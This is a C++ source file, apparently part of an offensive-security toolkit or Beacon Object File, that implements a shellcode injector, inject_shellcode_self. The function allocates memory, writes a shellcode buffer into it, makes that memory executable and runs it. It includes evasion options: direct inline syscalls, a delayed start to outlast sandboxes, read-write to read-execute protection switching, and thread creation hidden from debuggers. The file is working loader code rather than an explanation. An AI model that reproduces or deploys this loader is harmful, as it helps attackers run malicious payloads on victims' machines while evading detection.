#pragma clang diagnostic ignored "-Wnested-anon-types"
#pragma clang diagnostic ignored "-Wgnu-anonymous-struct"

#include "inject.hpp"

#ifdef SYSCALLS
    #include "deps/inline_syscall/include/in_memory_init.hpp"
#endif

#define NT_FAIL(status) (status < 0)

#ifdef _BOF_
#pragma clang diagnostic ignored "-Wdollar-in-identifier-extension"

extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI void KERNEL32$Sleep(
  DWORD dwMilliseconds
);
#define Sleep KERNEL32$Sleep

extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI LPVOID KERNEL32$VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
#define VirtualAllocEx KERNEL32$VirtualAllocEx

extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI BOOL KERNEL32$VirtualProtectEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);
#define VirtualProtectEx KERNEL32$VirtualProtectEx

extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI BOOL KERNEL32$WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
#define WriteProcessMemory KERNEL32$WriteProcessMemory

extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI HANDLE KERNEL32$CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
#define CreateRemoteThread KERNEL32$CreateRemoteThread

extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI DWORD KERNEL32$WaitForSingleObject(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);
#define WaitForSingleObject KERNEL32$WaitForSingleObject
#endif

void my_init_syscalls_list(void) {
    #ifdef SYSCALLS
    jm::init_syscalls_list();
    #endif
}

LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThread, BOOL wait, unsigned int sleep_time) {
    #ifdef _DEBUG_
        if (sleep_time > 0)
            printf("sleeping for %d seconds!\n", sleep_time);
    #endif
    #ifdef SYSCALLS
        NTSTATUS status = STATUS_PENDING;
        LARGE_INTEGER li_sleep_time;
        li_sleep_time.QuadPart = -((long long)sleep_time * 10000000);
        status = INLINE_SYSCALL(NtDelayExecution)(TRUE, &li_sleep_time);
        if (NT_FAIL(status)) {
            #ifdef _DEBUG_
                printf("ERROR: NtDelayExecution = 0x%x\n", status);
            #endif
            return NULL;
        }
    #else
        Sleep(sleep_time);
    #endif

    #if defined(SELFINJECT) && defined(RX) && defined(_TEXT_)
        typedef void* (*funcPtr)();
        funcPtr func = (funcPtr)shellcode;
        *phThread = 0;
        #ifdef _DEBUG_
            puts("self executing the payload in .text");
        #endif
        return (*func)();
    #else
        void *allocation = nullptr;
        #ifdef SYSCALLS
            status = INLINE_SYSCALL(NtAllocateVirtualMemory)(
                (HANDLE)-1,
                &allocation,
                0,
                &size,
                MEM_RESERVE | MEM_COMMIT,
                #ifdef RX
                PAGE_READWRITE);
                #else
                PAGE_EXECUTE_READWRITE);
                #endif
            if (NT_FAIL(status) || !allocation)
            {
                #ifdef _DEBUG_
                printf("ERROR: NtAllocateVirtualMemory = 0x%x\n", status);
                #endif
                return NULL;
            }
        #else
            allocation = VirtualAllocEx(
                (HANDLE)-1,
                0,
                size,
                MEM_RESERVE | MEM_COMMIT,
                #ifdef RX
                PAGE_READWRITE);
                #else
                PAGE_EXECUTE_READWRITE);
                #endif
            if (!allocation)
            {
                #ifdef _DEBUG_
                printf("ERROR: VirtualAllocEx = 0x%x\n", GetLastError());
                #endif
                return NULL;
            }
        #endif

        #ifdef _DEBUG_
            printf("Allocated rwx memory @ 0x%x\n", allocation);
        #endif

        SIZE_T bytesWritten = 0;

        #ifdef SYSCALLS
            status = INLINE_SYSCALL(NtWriteVirtualMemory)(
                (HANDLE)-1,
                allocation,
                shellcode,
                size,
                &bytesWritten);

            if (NT_FAIL(status) || bytesWritten < size)
            {
                #ifdef _DEBUG_
                printf("ERROR: NtWriteVirtualMemory = 0x%x\n", status);
                #endif
                return NULL;
            }
        #else
            BOOL res = WriteProcessMemory(
                (HANDLE)-1,
                allocation,
                shellcode,
                size,
                &bytesWritten);

            if (!res) {
                #ifdef _DEBUG_
                printf("ERROR: WriteProcessMemory = 0x%x\n", GetLastError());
                #endif
                return NULL;
            }
        #endif

        #ifdef _DEBUG_
            printf("Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
        #endif

        #ifdef RX
            DWORD old = 0;
            #ifdef SYSCALLS
            status = INLINE_SYSCALL(NtProtectVirtualMemory)(
                (HANDLE)-1,
                allocation,
                size,
                PAGE_EXECUTE_READ,
                &old);

            if (NT_FAIL(status) || old == 0)
            {
                #ifdef _DEBUG_
                printf("ERROR: NtProtectVirtualMemory = 0x%x\n", status);
                #endif
                return NULL;
            }
            #else
            res = VirtualProtectEx(
                (HANDLE)-1,
                allocation,
                size,
                PAGE_EXECUTE_READ,
                &old);

            if (!res) {
                #ifdef _DEBUG_
                printf("ERROR: VirtualProtectEx = 0x%x\n", GetLastError());
                #endif
                return NULL;
            }
            #endif
        #endif

        #ifdef SELFINJECT
            typedef void* (*funcPtr)();
            funcPtr func = (funcPtr)allocation;
            *phThread = 0;
            #ifdef _DEBUG_
                puts("self executing the allocated payload");
            #endif
            return (*func)();
        #elif SYSCALLS
            status = INLINE_SYSCALL(NtCreateThreadEx)(
                phThread,
                THREAD_ALL_ACCESS,
                nullptr,
                (HANDLE)-1,
                allocation,
                allocation,
                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                0,
                0,
                0,
                nullptr);

            if (NT_FAIL(status) || !*phThread)
            {
                #ifdef _DEBUG_
                printf("ERROR: NtCreateThreadEx = 0x%x\n", status);
                #endif
                return NULL;
            }
        #else
            *phThread = CreateRemoteThread(
                (HANDLE)-1,
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)allocation,
                allocation,
                NULL,
                NULL
            );

            if (!*phThread) {
                #ifdef _DEBUG_
                printf("ERROR: CreateRemoteThread = 0x%x\n", GetLastError());
                #endif
                return NULL;
            }
        #endif

        #ifdef _DEBUG_
            printf("Created thread #%d\n", *phThread);
        #endif

        if (wait) {
            #ifdef _DEBUG_
                printf("Waiting for thread #%d\n", *phThread);
            #endif
            #ifdef SYSCALLS
                INLINE_SYSCALL(NtWaitForSingleObject)(*phThread, TRUE, NULL);
            #else
                WaitForSingleObject(*phThread, -1);
            #endif
        }

        return allocation;
    #endif
}